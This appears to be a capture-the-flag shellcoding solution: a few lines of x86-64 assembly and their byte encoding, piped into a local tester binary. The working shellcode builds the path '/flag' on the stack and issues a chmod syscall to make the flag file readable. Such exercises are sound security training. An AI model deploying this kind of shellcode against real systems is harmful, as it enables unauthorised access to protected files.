```assembly
push 0x616c662f
push rsp
pop rdi
push 0x67
pop rsi
mov DWORD PTR [rdi+0x4],esi
lea eax,[rsi-0xd]
syscall
```

---

`python2 -c "print '\x68\x2f\x66\x6c\x61\x54\x5f\x6a\x67\x5e\x89\x77\x04\x8d\x46\xf3\x0f\x05'" | ./shellcoding_tester`
